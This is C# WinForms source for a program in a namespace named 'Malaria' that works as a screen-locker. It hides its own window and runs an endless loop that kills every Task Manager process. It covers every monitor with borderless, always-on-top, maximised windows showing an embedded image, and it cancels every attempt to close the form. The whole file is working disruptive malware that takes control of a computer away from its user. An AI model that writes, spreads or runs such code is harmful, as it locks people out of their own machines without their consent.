using System.Diagnostics;
using Malaria.Properties;

namespace Malaria;

public partial class Form1 : Form
{
    public Form1()
    {
        Visible = false;
        ShowInTaskbar = false;

        new Thread(KillTaskManager).Start();
        DisplayImageOnAllScreens();
    }

    /// <summary>
    /// Continuously monitors and terminates any running instances of Task Manager.
    /// </summary>
    private static void KillTaskManager()
    {
        while (true)
        {
            var processes = Process.GetProcessesByName("taskmgr");
            foreach (var process in processes) process.Kill();
        }
    }
    
    /// <summary>
    /// Displays an image on all available screens.
    /// </summary>
    private static void DisplayImageOnAllScreens()
    {
        foreach (var screen in Screen.AllScreens)
        {
            var form = new Form
            {
                StartPosition = FormStartPosition.CenterScreen,
                Location = screen.Bounds.Location,
                Size = screen.Bounds.Size,
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                TopMost = true,
                BackgroundImageLayout = ImageLayout.Stretch
            };

            var imageResource = Resources.ResourceManager.GetObject("bg");
            form.BackgroundImage = imageResource switch
            {
                byte[] imageBytes => Image.FromStream(new MemoryStream(imageBytes)),
                Image image => image,
                _ => form.BackgroundImage
            };

            form.Show();
        }
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        e.Cancel = true;
    }
}